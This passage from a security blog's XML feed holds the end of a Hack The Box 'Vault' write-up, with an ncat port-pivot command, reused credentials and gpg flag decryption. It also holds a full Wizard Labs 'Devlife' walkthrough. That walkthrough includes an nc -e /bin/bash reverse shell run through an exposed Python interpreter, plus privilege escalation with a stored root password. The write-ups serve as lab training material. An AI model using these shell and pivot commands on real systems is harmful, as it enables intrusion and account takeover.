the request from a source port which is random , that request is sent to the destination port which in this case is port 80. To be able to access port 987 we have to make sure that our source port is 4444. To do this we will use ncat and make it listen on port 2222 , then the service running on that port will be another ncat connection from port 4444 to port 987 on 192.168.5.2 ncat -l 2222 --sh-exec &quot;ncat -p 4444 192.168.5.2 987&quot; We will get another ssh connection to DNS , then we will connect to port 2222 on localhost , but before connecting we need to know what’s the service. Unfortunately nmap can’t tell us because our connection is not direct. So I guessed common services and it was ssh : I tried dave as the username and dav3gerous567 as the password (same credentials for DNS) and it worked. Decrypting root flag In the /home directory of dave on vault there’s a file called root.txt.gpg : Which is the root flag but gpg encrypted : We need a key to decrypt the flag , remember the key we saw earlier on ubuntu ? We will copy the file to ubuntu to decrypt it , Easiest way to do it is to base64 encode it then copy the base64 data and decode it on ubuntu. But base64 was not installed on vault so I used base32 instead : Now let’s decrypt it with the key : itscominghome : gpg -d root.txt.gpg And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Curling Next Hack The Box write-up : Hack The Box - RedCross</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/vault/0.png" /></entry><entry><title type="html">Wizard Labs - Devlife</title><link href="http://localhost:4000/wizard-labs/devlife/" rel="alternate" type="text/html" title="Wizard Labs - Devlife" /><published>2019-04-02T00:00:00+02:00</published><updated>2019-04-02T00:00:00+02:00</updated><id>http://localhost:4000/wizard-labs/devlife</id><content type="html" xml:base="http://localhost:4000/wizard-labs/devlife/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-this-is-my-write-up-about-devlife-from-wizard-labs-which-is-their-second-box-to-retire-just-like-dummy-its-another-easy-box-difficulty--210--its-a-linux-box-and-its-ip-is-101120-so-lets-jump-right-in-&quot;&gt;Hey guys this is my write-up about Devlife from Wizard Labs which is their second box to retire. Just like &lt;a href=&quot;/wizard-labs/dummy/&quot;&gt;dummy&lt;/a&gt; it’s another easy box (Difficulty : 2/10) , It’s a linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.1.1.20&lt;/code&gt; so let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/devlife/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;We will start with nmap to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC 10.1.1.20&lt;/code&gt;
&lt;img src=&quot;/images/wizardlabs/devlife/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;only-2-ports-are-open--22-running-ssh-and-80-running-http-lets-check-http&quot;&gt;Only 2 ports are open , 22 running ssh and 80 running http. Let’s check http.&lt;/h4&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;on-the-main-page-we-get-this-about-me-message-and-nothing-else-&quot;&gt;On the main page we get this “About me” message and nothing else :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/devlife/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;About Me

Hello , My name is Teddy Smith , I am a Python developer since 2007 !

Here I gonna share some Django tutorials and tutorials about System Administation in Python also I will write a Python online interpreter !!

Stay Tuned ...

TS

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-ran-gobuster-with-usrsharewordlistsdirbcommontxt-and-got-these-results-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/wordlists/dirb/common.txt&lt;/code&gt; and got these results :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/.hta (Status: 403)
/dev (Status: 301)
/index.html (Status: 200)
/manual (Status: 301)
/server-status (Status: 403)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;getting-user&quot;&gt;Getting user&lt;/h3&gt;
&lt;h4 id=&quot;so-i-checked-dev-and-found-this-online-python-27-interpreter-&quot;&gt;So I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev&lt;/code&gt; and found this &lt;code class=&quot;highlighter-rouge&quot;&gt;Online Python 2.7 Interpreter&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/devlife/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great--now-we-can-get-a-reverse-shell-in-many-ways--i-just-imported-os-then-did-ossystemreverse-shell-payload-&quot;&gt;Great , now we can get a reverse shell in many ways , I just imported &lt;code class=&quot;highlighter-rouge&quot;&gt;os&lt;/code&gt; then did &lt;code class=&quot;highlighter-rouge&quot;&gt;os.system(reverse shell payload)&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;import os;os.system('nc -e /bin/bash 10.xx.xx.xx 1337')&lt;/code&gt;
&lt;img src=&quot;/images/wizardlabs/devlife/4.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/wizardlabs/devlife/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-user-&quot;&gt;And we owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;stored-root-credentials--privilege-escalation&quot;&gt;Stored root Credentials , Privilege Escalation&lt;/h3&gt;
&lt;h4 id=&quot;in-the-home-directory-of-tedd-there-is-a-directory-called-env--lets-check-that&quot;&gt;In the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;tedd&lt;/code&gt; there is a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;.env&lt;/code&gt; , Let’s check that.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/devlife/6.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/wizardlabs/devlife/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-notice-a-python-script-called-supy--which-runs-su-root-and-uses-the-password-to-authenticate-&quot;&gt;We notice a python script called &lt;code class=&quot;highlighter-rouge&quot;&gt;su.py&lt;/code&gt; , which runs &lt;code class=&quot;highlighter-rouge&quot;&gt;su root&lt;/code&gt; and uses the password to authenticate :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/devlife/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import pexpect
child = pexpect.spawn('su root')
child.expect ('Password:')
child.sendline('teddyxy2019')
child.expect('\$')
child.sendline('whoami')
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-we-can-su-to-root-using-the-password-teddyxy2019-&quot;&gt;Now we can &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; to root using the password &lt;code class=&quot;highlighter-rouge&quot;&gt;teddyxy2019&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/devlife/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;h4 id=&quot;previous-wizard-labs-write-up--wizard-labs---dummy&quot;&gt;Previous Wizard Labs Write-up : &lt;a href=&quot;/wizard-labs/dummy/&quot;&gt;Wizard Labs - Dummy&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="Python" /><summary type="html">Quick Summary Hey guys this is my write-up about Devlife from Wizard Labs which is their second box to retire. Just like dummy it’s another easy box (Difficulty : 2/10) , It’s a linux box and its ip is 10.1.1.20 so let’s jump right in ! Nmap We will start with nmap to scan for open ports and services : nmap -sV -sT -sC 10.1.1.20 Only 2 ports are open , 22 running ssh and 80 running http. Let’s check http. HTTP Initial Enumeration On the main page we get this “About me” message and nothing else : About Me Hello , My name is Teddy Smith , I am a Python developer since 2007 ! Here I gonna share some Django tutorials and tutorials about System Administation in Python also I will write a Python online interpreter !! Stay Tuned ... TS I ran gobuster with /usr/share/wordlists/dirb/common.txt and got these results : /.htpasswd (Status: 403) /.htaccess (Status: 403) /.hta (Status: 403) /dev (Status: 301) /index.html (Status: 200) /manual (Status: 301) /server-status (Status: 403) Getting user So I checked /dev and found this Online Python 2.7 Interpreter : Great , now we can get a reverse shell in many ways , I just imported os then did os.system(reverse shell payload) : import os;os.system('nc -e /bin/bash 10.xx.xx.xx 1337') And we owned user ! Stored root Credentials , Privilege Escalation In the /home directory of tedd there is a directory called .env , Let’s check that. We notice a python script called su.py , which runs su root and uses the password to authenticate : import pexpect child = pexpect.spawn('su root') child.expect ('Password:') child.sendline('teddyxy2019') child.expect('\$') child.sendline('whoami') Now we can su to root using the password teddyxy2019 : And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Wizard Labs Write-up : Wizard Labs - Dummy</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/wizardlabs/devlife/0.png" /></entry></feed>